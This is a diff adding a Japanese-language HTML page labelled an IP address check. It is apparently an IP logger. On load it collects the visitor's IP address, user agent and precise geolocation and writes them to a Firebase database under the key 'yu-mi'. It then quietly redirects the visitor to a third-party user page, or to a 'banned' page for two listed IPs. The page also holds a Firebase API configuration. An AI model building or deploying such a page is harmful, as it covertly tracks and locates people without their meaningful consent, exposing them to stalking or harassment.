@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IPアドレスチェック</title>
+</head>
+<body>
+    <h1>ようこそ</h1>
+    <p>IPアドレス: <span id="ipAddress"></span></p>
+    <p>ユーザーエージェント: <span id="userAgent"></span></p>
+    <p>位置情報: <span id="location"></span></p>
+    <p>時間: <span id="timestamp"></span></p>
+
+    <!-- Firebase SDKの読み込み -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <script>
+        // IP BANリスト
+        const bannedIPs = ['180.199.223.65', '180.199.223.5']; // BANしたいIPアドレスをここに追加
+
+        // Firebaseの設定
+        const firebaseConfig = {
+            apiKey: "AIzaSyDGHRQsE7-YH0UxEJ8FvdShUr3_k3AoMQM",
+            authDomain: "ip-add-47c83.firebaseapp.com",
+            databaseURL: "https://ip-add-47c83-default-rtdb.firebaseio.com",
+            projectId: "ip-add-47c83",
+            storageBucket: "ip-add-47c83.appspot.com",
+            messagingSenderId: "711426693718",
+            appId: "1:711426693718:web:258764df678e37350779f7"
+        };
+
+        // Firebaseの初期化
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // IPアドレスを取得
+        fetch('https://ipinfo.io?callback')
+            .then(res => res.text())
+            .then(data => {
+                const ipInfo = JSON.parse(data.replace(/.*\((.*)\)/, '$1'));
+                const ip = ipInfo.ip;
+                document.getElementById("ipAddress").textContent = ip;
+
+                // ユーザーエージェントを取得
+                const userAgent = navigator.userAgent;
+                document.getElementById("userAgent").textContent = userAgent;
+
+                // 位置情報を取得
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        const location = `${position.coords.latitude}, ${position.coords.longitude}`;
+                        document.getElementById("location").textContent = location;
+                        sendData(ip, location, userAgent);
+                    }, error => {
+                        const location = 'N/A'; // 位置情報の取得に失敗した場合、N/Aとして設定
+                        document.getElementById("location").textContent = location;
+                        sendData(ip, location, userAgent);
+                    });
+                } else {
+                    // ブラウザが位置情報をサポートしていない場合、N/Aとして設定
+                    const location = 'N/A';
+                    document.getElementById("location").textContent = location;
+                    sendData(ip, location, userAgent);
+                }
+            })
+            .catch(error => {
+                console.error('IPアドレスの取得中にエラーが発生しました: ', error);
+            });
+
+        // データを送信する関数
+        function sendData(ip, location, userAgent) {
+            // 現在の時間を取得
+            const timestamp = new Date().toLocaleString();
+            document.getElementById("timestamp").textContent = timestamp;
+
+            // Firebase Realtime Databaseにデータを送信
+            const dataRef = db.ref('yu-mi');
+            const newDataRef = dataRef.push();
+
+            // データをオブジェクトとして送信
+            const userData = {
+                timestamp: timestamp,
+                ip: ip,
+                location: location,
+                userAgent: userAgent
+            };
+
+            // データを送信
+            newDataRef.set(userData, (error) => {
+                if (error) {
+                    console.error('データの送信中にエラーが発生しました: ', error);
+                } else {
+                    console.log('データがFirebaseに送信されました。');
+                }
+
+                // IPがBANされている場合、BANページにリダイレクト
+                if (bannedIPs.includes(ip)) {
+                    window.location.href = 'https://lighthearted-manatee-c3344e.netlify.app/banned.html';
+                } else {
+                    // BANされていない場合、Googleにリダイレクト
+                    window.location.href = 'https://www.ninjar.jp/users/yuumi306/themes/new';
+                }
+            });
+        }
+    </script>
+</body>
+</html>
